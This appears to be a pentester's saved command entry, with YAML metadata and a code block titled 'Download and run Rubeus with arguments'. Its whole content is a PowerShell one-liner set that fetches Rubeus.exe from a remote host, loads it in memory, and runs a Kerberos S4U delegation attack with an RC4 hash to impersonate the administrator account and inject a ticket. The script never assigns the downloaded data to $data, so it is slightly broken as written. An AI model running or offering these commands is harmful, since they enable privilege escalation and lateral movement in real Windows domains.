---
id: a8c2bc5b-c1aa-4a05-ba17-a397b3485009
name: Download and run Rubeus with arguments
type: command
executor: bash
data: '(New-Object System.Net.WebClient).DownloadData(''http://10.10.16.7/Rubeus.exe'')

  $assem = [System.Reflection.Assembly]::Load($data)

  [Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator
  /msdsspn:cifs/file01 /ptt".Split())'
output: null
created_at: '2023-04-06T03:56:24.082063+00:00'
updated_at: '2023-04-10T20:37:02.186238+00:00'
---

# Download and run Rubeus with arguments

```bash
(New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())
```


